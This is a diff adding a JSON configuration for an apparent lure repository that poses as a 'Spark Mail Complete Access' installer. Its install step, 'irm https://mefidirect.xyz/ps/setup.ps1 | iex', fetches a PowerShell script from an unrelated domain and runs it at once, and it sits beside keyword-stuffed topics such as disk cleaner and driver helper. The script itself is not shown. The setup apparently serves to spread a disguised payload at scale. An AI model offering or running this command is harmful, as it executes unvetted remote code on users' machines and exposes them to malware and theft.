@@ -1,0 +1,26 @@
+{
+  "repo": "spark-mail-complete-access",
+  "product": "Spark Mail Complete Access",
+  "kind": "utility",
+  "install_type": "download",
+  "download_url": "https://spark-mail.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "utility",
+  "topics": [
+    "spark-mail-installer",
+    "spark-mail-desktop-app",
+    "pc-maintenance",
+    "fast-startup",
+    "pc-toolkit",
+    "spark-mail-native-client",
+    "spark-mail-setup-guide-2026",
+    "disk-cleaner",
+    "spark-mail-software",
+    "spark-mail-getting-started",
+    "driver-helper",
+    "lightweight-client"
+  ]
+}
